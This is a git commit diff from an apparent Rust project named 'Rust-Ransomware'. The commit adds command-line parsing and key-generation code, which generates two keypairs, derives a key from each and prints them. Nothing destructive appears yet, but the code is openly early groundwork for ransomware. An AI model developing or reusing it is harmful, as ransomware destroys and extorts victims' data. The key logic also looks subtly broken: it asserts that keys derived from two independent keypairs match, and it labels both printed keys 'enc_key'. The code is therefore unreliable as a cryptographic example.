5f72fedb10686bde6f9ceb3761a84263b262db9a
amiroooamiran <amiran.amirhossein@gmail.com>
2024-04-04 09:40:29 +0330

    ☑️ create privet and public keys

--- src/main.rs
+++ src/main.rs
@@ -7,7 +7,32 @@ use chacha20poly1305::Nonce;
 
 use clap::Parser;
 
+#[derive(Parser, Debug)]
+#[clap(name = "Rust-Ransomware")]
+struct Args {
+    #[clap(short, long)]
+    input: String,
+}
 
 fn main() {
-    println!("Hello, world!");
+    let args = Args::parse();
+
+    let (priv1, pub1) = gen_keys::get_keypair(None);
+    let _ = gen_keys::dump_asym_keys(&priv1, &pub1, None);
+    println!("");
+
+    let (priv2, pub2) = gen_keys::get_keypair(None);
+    let _ = gen_keys::dump_asym_keys(&priv2, &pub2, None);
+    println!("");
+
+    let enc_key = gen_keys::get_symmetric_key(&priv1, &pub1);
+    let dec_key = gen_keys::get_symmetric_key(&priv2, &pub2);
+
+    assert_eq!(enc_key, dec_key);
+
+    println!("enc_key = {:?}", enc_key);
+    println!("");
+    println!("enc_key = {:?}", dec_key);
+    println!("");
+
 }
